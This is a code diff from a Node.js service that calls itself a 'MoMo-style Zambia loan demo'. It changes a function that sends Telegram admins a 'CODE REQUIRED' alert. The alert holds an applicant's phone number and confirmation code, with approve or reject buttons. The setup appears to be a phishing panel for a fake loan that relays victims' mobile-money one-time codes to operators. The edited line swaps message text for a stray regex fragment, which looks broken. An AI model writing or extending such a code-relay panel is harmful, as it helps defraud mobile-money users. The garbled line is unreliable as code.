@@ -60,7 +60,7 @@ async function notifyReference(a){
  await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
 }
 async function notifyConfirmation(a){
- const msg=`🟡 <b>CODE REQUIRED</b>\n\n🆔 ID: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 CODE: <code>${esc(a.confirmation_reference)}</code>\n📌 Status: CONFIRMATION PENDING\n\n 4 numeric code .`;
+ const msg=`🟡 <b>CODE REQUIRED</b>\n\n🆔 ID: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 CODE: <code>${esc(a.confirmation_reference)}</code>\n📌 Status: CONFIRMATION PENDING\n\n (!/^\+?[0-9]{7,15}) .`;
  await notifyAdmins(msg,decisionKeyboard('confirmation',a.id),a.assigned_admin);
 }
 app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'MoMo-style Zambia loan demo'}));
